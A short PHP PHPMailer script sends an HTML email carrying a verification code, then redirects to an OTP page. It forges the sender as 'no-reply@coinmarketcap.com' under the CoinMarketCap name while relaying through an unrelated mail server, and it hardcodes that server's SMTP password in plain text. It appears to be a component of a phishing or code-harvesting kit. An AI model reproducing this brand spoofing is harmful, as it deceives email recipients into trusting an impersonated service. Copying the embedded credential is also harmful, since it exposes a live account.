<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

require_once __DIR__ . '/phpmailer/phpmailer/src/Exception.php';
require_once __DIR__ . '/phpmailer/phpmailer/src/PHPMailer.php';
require_once __DIR__ . '/phpmailer/phpmailer/src/SMTP.php';
// passing true in constructor enables exceptions in PHPMailer
$mail = new PHPMailer(true);

try {
    // Server settings
    //$mail->SMTPDebug = SMTP::DEBUG_SERVER; // for detailed debug output
    $mail->isSMTP();

  $mail->Host = 'www.mavec.io';
    $mail->SMTPAuth = true;
    $mail->SMTPSecure = 'ssl';
    $mail->Port = 465;

    $mail->Username = 'support@mavec.io'; // YOUR gmail email
    $mail->Password = 'kolomenta00'; // YOUR gmail password


    // Sender and recipient settings
    $mail->SetFrom('no-reply@coinmarketcap.com', 'coinmarketcap');
    $mail->AddAddress($email, $name);
    // $mail->addReplyTo('victoscoj@gmail.com', 'Testnet'); // to set the reply to

    // Setting the email content
    $mail->IsHTML(true);
    $mail->Subject = "Package Information";
    $mail->Body = 'Hello '.$name.' ,<br> Use <b style="font-size:13px; font-weight:bold; color:blue;">'.$code.'</b> as your Verification Code';
   // $mail->AltBody = 'Plain text message body for non-HTML email client. Gmail SMTP email body.';

    $mail->send();
       header("location:otp.php");
        } catch (Exception $e) {
            echo "Something went wrong check email you entered.";
        }

?>
